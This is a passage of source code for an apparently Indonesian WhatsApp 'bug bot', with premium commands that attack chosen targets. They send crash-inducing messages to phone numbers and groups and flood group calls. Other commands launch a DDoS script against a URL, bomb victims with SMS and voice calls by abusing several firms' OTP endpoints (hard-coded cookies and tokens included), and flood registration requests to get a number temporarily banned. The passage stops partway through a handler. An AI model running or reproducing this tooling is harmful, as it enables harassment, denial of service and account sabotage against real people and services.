if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
await ordmess(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await ordmess(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await ordmess(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
await sleep(1000)
await ordmess(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await ordmess(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await ordmess(sendto, jumlah,  `༑😈𝐏𝚯⃟𝐢𝐙𝟎𝐍 ⬪ 𝐙̸𝚺𝐓͢᪾𝐒𝐔𝐁𝚯⃟𝐗𝐆👿༑`)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'locmess':
case 'serlok':
case 'buglocation':
case 'crashloc': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1]
await locbug(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await locbug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await locbug(sendto, jumlah,  `🍻°⃟૰𝐤𝐢𝐥𝐥𝐞𝐫 -!𝐭𝐡𝐞𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧🍺ꢵ`)
await sleep(1000)
await locbug(sendto, jumlah,  `💔'҉༑⃟𝐓𝐇𝚺͢𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝟎̸͢𝐗𝐘𝐆̸𝚵𝐍❤️‍🩹`)
await sleep(1000)
await locbug(sendto, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await locbug(sendto, jumlah,  `🍻°⃟૰𝐤𝐢𝐥𝐥𝐞𝐫 -!𝐭𝐡𝐞𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧🍺ꢵ`)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'locgp': 
case 'buglocgc':
case 'locgc':
case 'gpcrash':
case 'angjqy':
case 'serlokgc': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} https://chat.whatsapp.com/IwNg19SowhdI`);
let result = args[0].split('https://chat.whatsapp.com/')[1]
let gpJid = await ryozingod.groupAcceptInvite(result)
await locbug(gpJid, 50,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
await locbug(gpJid, 50,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 target : ${result}`)
}
break

case 'buggc':
case 'lag-gk?':
case 'kok-lagya':
case 'gp-bug':
case 'ngelag-woi':
case 'bugbokep':
case 'get-attention': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} https://chat.whatsapp.com/IwNg19SowhdI`);
let result = args[0].split('https://chat.whatsapp.com/')[1]
let gpJid = await ryozingod.groupAcceptInvite(result)
for (let i = 0; i < 100; i++) {
await endcall(gpJid, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await locbug(gpJid, 1,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
}
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Group Target : ${gpJid} \n🧪 Jenis Bug : ${command}\n🧪`)
}
break

case 'hengsot':
case 'hedsot':
case 'mledak':
case 'teluhvagina':
case '1shoot':
case '1kill':
case 'akuruok': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 120363228732435094@g.us`);
let gpJid = q
for (let i = 0; i < 100; i++) {
await endcall(gpJid, `𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${ios1}`)
await sleep(1000)
await locbug(gpJid, 1,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
}
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Group Target : ${gpJid} \n🧪 Jenis Bug : ${command}\n🧪`)
}
break

case 'bugchanel': 
case 'newsbug': 
case 'newsletterinvite': 
case 'chanelinvite': 
case 'newsinvite': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 3`);
jumlah = q
await invnews(m.chat, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'buginvite': 
case 'bugprivchat': 
case 'bugchat': 
case 'aduhngelag🤣': 
case 'hpkudipirtex': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 3`);
jumlah = q
await invgp(m.chat, jumlah,  `ՙ͜͜ ꒷⃟༑🦠 𝐓͢𝐇𝚺𝐙̸͢𝚵𝐓𝐒͢𝐔𝐁𝛀͢𝐗𝐘𝐆͢𝚺𝐍 ⿻  𝐙͢𝐱𝐕 ⟠ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 💀̳̳͒ ꒷ ՚͜͜ `)
await sleep(1000)
xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break
case 'spamsms': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 62,878937388273|1`)
let matches = q.match(/62,(\d+)\|(\d+)/)
if (!matches) return xgreply('Invalid input format.')
let anjayy = matches[1];
let jumlah = matches[2];
for (let i = 0; i < jumlah; i++) {
await fetch("https://www.oto.com/ovb/send-otp?lang=id", {method:"POST",body:`mobile=${anjayy}&bookingId=0&businessUnit=mobil`,headers:{"Accept":"application/json, text/javascript, */*; q=0.01","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Cookie":"_CO_anonymousId=d895fba2-cb30-ff87-1d56-0ea0c035fb70; _CO_type=connecto; _CO_html5PermissionStatus=%7B%22status%22%3A%22default%22%2C%22time%22%3A%222024-03-15T01%3A59%3A00.683Z%22%7D; primary_utm_campaign=none; primary_utm_medium=none; primary_utm_source=Direct; utm_campaign=none; utm_medium=none; utm_source=Direct; landing_url=https%3A%2F%2Fwww.oto.com%2F; _csrf=tmqjNh8o6pPhEEu6QVfQ2ng94P302rS7; GCLB=CNXRvs7n0--CgAEQAw; _gcl_au=1.1.2014414873.1710467881; page_view=1; _ga_3Y81C1WC5H=GS1.1.1710467887.1.0.1710467887.60.0.0; _co_session_active=1; _ga=GA1.2.1213611959.1710467887; _gid=GA1.2.513695536.1710467892; _gat=1; _fbp=fb.1.1710467891782.2054515988; __gads=ID=7ce4179980a0d191:T=1710467892:RT=1710467892:S=ALNI_MbKgH0rH5dyUymZVGywKhIjRwS9JQ; __gpi=UID=00000d37d653843c:T=1710467892:RT=1710467892:S=ALNI_MbNaFl3wRcTl-p1nGYNM_vU1wbAfg; __eoi=ID=e0310b98b18ee544:T=1710467892:RT=1710467892:S=AA-Afjak-TLJzn0x4vHNkS4tST1f; _pbjs_userid_consent_data=3524755945110770; pbjs-pubCommonId=78d31f4c-ba42-4d0d-8dfb-7f382917cb71; _lr_retry_request=true; _lr_env_src_ats=false; pubmatic-unifiedid=%7B%22TDID%22%3A%221bcde2b6-9f8b-4538-badc-528178edb4ed%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222024-02-15T01%3A58%3A19%22%7D; _cc_id=18c3457dddcb22d6e2d494fe92ec9faf; panoramaId=87e01b4df01eb3d59f536106216216d53938fadec6ba2de73e2248d9332a655e; panoramaIdType=panoIndiv; cto_bidid=FP9l9F9XWmo1QmZ0T3dpZWMwTTBmTTk2M0J5RTNjamtPd0E1RW82Y1BNR3NYSHIlMkZheFJuR0JZNVdvemwlMkZ6WVBhNm9kdHFpd0dKSXdjNTVSZUw2TVpRektRaVp3NiUyRjBtYllQcHR6c0YzZFVyMUgxTSUzRA; cto_bundle=UTHX0V9YeDFBMTdZJTJCbXM0WmgxZGRiMW55UGk1RVk4Z2htSFc0MlZWM0RkYlo4QXVRVWhCS0pUWXVQcFJiMGp4S1VIQyUyQlByOGxBUkZKaTFQNmpOSHUwUUNUdW43Q1lQb1U5TnNlS2RRd2M2M1BEN1B0akFkU0Z6JTJCcjJSbjJSWDU1JTJGS2VlbldLb0JaSWxyWnJ5TXVJUmZUMDJ2dyUzRCUzRA; panoramaId_expiry=1711072699742; pbjs_debug=0; _browseet=eyJfdCI6MTcxMDQ2NzkwNjg0Mn0=; _browsee=eyJfaWQiOiJkMTkzNDA2NTkxN2YiLCJfdCI6MTcxMDQ2NzkwNjgzOSwiX3IiOjAsIl9wIjp7ImNvIjpmYWxzZSwiZXQiOnRydWUsInByIjpbXSwiaXQiOlsxXX19; FCNEC=%5B%5B%22AKsRol-3voJa04IkvGjjaVqQQvsefw7LA0NPHt44_uDItkJCREh8KisyNHLmYz940CSNQwc1_xHP-fqC21DpwqgQTk-OF9df_aKGFOu9eAcvwUlLQMiCeUQWUGmCCKP_8mmhYeUmF9mblbHRZJla6IIWXOZevMDBZQ%3D%3D%22%5D%5D;","Origin":"https://www.oto.com","Referer":"https://www.oto.com/ovb/user-login","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","User-Agent":randomUA,"X-Requested-With":"XMLHttpRequest"}}).then(res=>res.text()).then(xgreply);
await fetch("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP", { method: "POST", headers: { "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI2MmFiMjFjYi01MjQzLTQwMWMtODYzOC1jOTYzMGM3OTc3MjAiLCJleHBpcmVkIjoxNzExMzk0MTA4NzE5LCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMTM5NDEwOCwiaWF0IjoxNzExMzkwNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.TGrmjA61KCOEsgIA0v5amOFQcR_R69t_V6NvLUCpOuS_qYe1XEGrhSCUfUmJSkan7Mrp3FEfoQv4sO44_lUsaw", "Content-Type": "application/json", "Client-Platform": "WEB", "Client-Timestamp": "1711390531053", "Sec-Ch-Ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "User-Agent": randomUA }, body: JSON.stringify({ account: anjayy }) }).then(res=>res.text()).then(xgreply);
await fetch("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS", { method: "POST", headers: { "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiI2MmFiMjFjYi01MjQzLTQwMWMtODYzOC1jOTYzMGM3OTc3MjAiLCJleHBpcmVkIjoxNzExMzk0MTA4NzE5LCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMTM5NDEwOCwiaWF0IjoxNzExMzkwNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.TGrmjA61KCOEsgIA0v5amOFQcR_R69t_V6NvLUCpOuS_qYe1XEGrhSCUfUmJSkan7Mrp3FEfoQv4sO44_lUsaw", "Content-Type": "application/json", "Client-Platform": "WEB", "Client-Timestamp": "1711390531053", "Sec-Ch-Ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "User-Agent": randomUA }, body: JSON.stringify({ account: anjayy }) }).then(res=>res.text()).then(xgreply);
await fetch("https://www.lamudi.co.id/check-mobile-number", { method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.lamudi.co.id", "Referer": "https://www.lamudi.co.id/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "User-Agent": randomUA }, body: JSON.stringify({ contactPhone: `+62${anjayy}`, formType: "register", mobileNumberLogin: true }) }).then(res=>res.text()).then(xgreply);
fetch("https://3second.co.id/api/member/login/otp", { method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Client_id": "null", "Content-Length": "24", "Cookie": "my-uuid=U2FsdGVkX19EWCgGrVc6KyygcEuUSuy3Ujoro39+StYykUuAQGt/Q4j3+toRDNLtOLyY0S4/LihDl3w0EVTbvQ==; _ga=GA1.1.367203880.1711392827; _fbp=fb.2.1711392827786.515283917; _ga_RRYHXN32WV=GS1.1.1711392828.1.0.1711392828.0.0.0; G_ENABLED_IDPS=google; _ga_BH9ERT796V=GS1.1.1711392827.1.1.1711392850.37.0.0; set-password-modal=U2FsdGVkX19LrPmd5aCpDkbO2QCaut/FKkHt3xT/zsw=", "Origin": "https://3second.co.id", "Os": "web", "Referer": "https://3second.co.id/?gad_source=1&gclid=Cj0KCQjwwYSwBhDcARIsAOyL0fh0AdkQuQ5BEELwt177Y7coJdioxmOtGzCUBtG5wenukr7LsAnPJDcaAhXeEALw_wcB", "Sec-Ch-Ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" }, body: JSON.stringify({ user: `62${anjayy}` }) }).then(res=>res.text()).then(xgreply);
await xgreply(`${anjayy}\n${jumlah}`)
await sleep(20000)
}
}
break

case 'ddos-mix': {
if (!isPremium) return xgreply(mess.premium)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
xgreply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
xgreply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break

case 'jadivirdocdelay': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
kusuma = async (teks) => {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7119-24/31272456_3646885428861027_874969884704491701_n.enc?ccb=11-4&oh=01_AdTPQRrW05khsE-dbK8kqF306fNpH_GNoBKrvDjIivwUMg&oe=6577EDC8&_nc_sid=5e03e0&mms3=true'",
"mimetype": "application/zxvclient",
"fileSha256": new Uint8Array([
    1, 138,  65,   5, 142, 150, 138, 137,
    244,  56, 243,  41,  10, 207, 140, 205,
    119, 129, 197, 189, 151, 207, 210, 176,
    162,  57, 251, 154,  70,  67,  88,  56
]),
"pageCount": 0,
"directPath":"/v/t62.7119-24/31272456_3646885428861027_874969884704491701_n.enc?ccb=11-4&oh=01_AdTPQRrW05khsE-dbK8kqF306fNpH_GNoBKrvDjIivwUMg&oe=6577EDC8&_nc_sid=5e03e0",
"fileLength": "64455",
"pageCount": 99999999,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": teks,
"fileEncSha256": new Uint8Array([
    236,  27, 100,  98, 231, 245, 196, 243,
    235,  71,  63, 149, 149,  57,  11, 124,
     84, 130, 175, 110, 186,  30, 240,  79,
     26, 102,  41, 147, 155, 184,   7, 220
]),
}
}), { userJid: m.chat, quoted: ryobug })
ryozingod.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
kusuma(`${q}.${ios1}`)
await sleep(3000)
kusuma(`ini basenya`)
}
break

case 'jadivirlocdelay': {
if (!isPremium) return xgreply(mess.premium)
inireact()
if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
ryozingod.sendMessage(m.chat, {location: {degreesLatitude: 173.282,degreesLongitude: -19.378,name:`${q} ${ios1}`,addrees: `${q} ${cartbutton}`, url: `https://${virtex2}.com`, comment: `anjay` , jpegThumbnail: nulll2 }},{quoted: ryobug})
}
break

case 'jadiwebios': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
inireact()
ryozingod.sendMessage(m.chat, {text: `${text}\nhttps://zxvclient.vision ?`, thumbnail: nulll, quoted: ryobug , contextInfo: { externalAdReply:{title: `🔥ZxV - Killer${ios2}`,body: `💚 Mark X Penis 🌤️${ios2}`,previewType:"PHOTO",thumbnail: nulll ,sourceUrl:`${text}\nhttps://zxvclient.vision`}}})
}
break

case 'jadifakecart': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 🍏͜͡ꨃ𝗭𝗲͢𝘁𝘀𝘂𝗯𝗼̚͢𝗫𝘆𝗴𝗲͢𝗻͜᪾͡𑱼̸🇯🇴`);
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    'listMessage': {
        'title': `🕷️ 𝕾𝖕𝖎𝖉𝖊𝖗🕷️ 🕸️𝖂𝖊𝖇🕸️${cartbutton}`,
        'footerText': `${q}${cartbutton}`,
        'description': `${q}${virtex2}`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
            'productSections': [{
                'title': 'anjay',
                'products': [
                    {"productId": "4392524570816732"}
                ]
            }],
            'headerImage': {
                'productId': 'anjay',
                'thumbnail': ""
            },
            'businessOwnerJid': '0@s.whatsapp.net'
        }
    },
    'footer': 'puki',
    'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
        }
    },
    'selectListType': 2,
    'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
    }
}), { userJid: m.chat, quoted: ryobug });
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id });
xgreply(mess.succes)
}
break

//Special
case 'sms':{
inireact()
	if (!isPremium) return xgreply(mess.prem);
           if (args.length < 1) return xgreply(`Penggunaan ${prefix}sms 62xnxx|psan|jumlah`)
			if (args[0].startsWith('08')) return xgreply('Awali nomor dengan 62') 
            var nomor = q.split("|")[0];
            var pesann = q.split("|")[1];
            var jumlahh = q.split("|")[2];
             axios.post("https://pesan.inipulsa.my.id/sms.php?c=sms&a=kirim", `phone=${nomor}&message=${pesann}& submit=${jumlahh}`)
            xgreply(`Sukses mengirim sms ke nomer ${nomor}`)
           }
break

case 'spamcall': {
if (!isPremium) return xgreply(mess.prem);
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
}
break

case 'tempban': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 62,85299262722`);
  let numbers = JSON.parse(fs.readFileSync('./tb/numbers.json'));

  let cCode = q.split(",")[0];
  let number = q.split(",")[1];
  let fullNo = cCode + number;

  await xgreply(mess.bugrespon + `\n❗Detail > \n🧪 Group Target : ${fullNo} \n🧪 Jenis : ${command}\n🧪Pending Request : 1 Juta Request`)

  let { state, saveCreds } = await useMultiFileAuthState('tb');

  let spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  });

  let dropNumber = async () => {
    try {
        let res = await spam.requestRegistrationCode({
          phoneNumber: `+${fullNo}`,
          phoneNumberCountryCode: cCode,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        });

        if (res.reason === 'temporarily_unavailable') {
          console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`);
            await sleep(1000)
            await dropNumber();
        }
    } catch (error) {
      console.error(error);
    }
  };

  numbers[fullNo] = { cCode, number };
  fs.writeFileSync('./tb/numbers.json', JSON.stringify(numbers, null, '\t'));
for (let i = 0; i < 100000; i++) {
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
dropNumber();
await sleep(500)
}
}
break

case 'valamak': 
case 'vios': 
case 'vbugip': 
case 'viphone':
case 'vbugios': 
case 'vcrashios': 
case 'ipkokcrash?': 
case 'katanyaip': 
case 'awok2ip': 
case 'ipbang?': {
inireact()
if (!isPremium) return xgreply(mess.premium)
if (!text) return xgreply(`Example: ${prefix + command} 6282823838,1`);
sendto = q.split(",")[0]+"@s.whatsapp.net"
jumlah = q.split(",")[1] * 30
for (let i = 0; i < jumlah; i++) {
await ryozingod.relayMessage(sendto, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
xgreply(`mess.bugrespon + \n❗Detail > \n🧪 Jenis Bug : ${command}\n🧪 Jumlah Bug: ${jumlah}`)
}
break

case 'inspect-web': {
    inireact();
    if (!q) return xgreply(`Example: ${m.prefix + m.command} https://www.nasa.gov/`);
    var response = await fetch(`https://dikaardnt.com/api/tool/inspect?url=${q}`);
    var data = await response.json();
    xgreply(`📝 URL: ${data.url}
    📖 Title: ${data.title}
    📝 Description: ${data.description}
    🔗 Links: ${data.links.join(', ')}
    🖼️ Image: ${data.image}
    📝 Content: ${data.content}
    👤 Author: ${data.author}
    🌐 Source: ${data.source}
    ⏲️ Time to Render: ${data.ttr} ms
    🔖 Type: ${data.type}`);
xgreply("An error occurred while fetching data. Please try again later.");
}
break

//Support
case "createunbanv1": case "createunbanv2": case "createunbanv3": case "createunbanv4": case "createunbanv5": {
if (!isPremium) return xgreply(mess.premium)
inireact()
let js = await fetch(`https://aemt.me/openai?text=${randomsupp}`) 
let json = await js.json()
xgreply(`

🛑Udah Siap Nih Bos, Btw sebelum Dipake Harus Diringkas dulu (kalo teksnya kepanjangan)

${json.result}`)
}
break

case 'unbanv1': {
if (!isPremium) return xgreply(mess.premium)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
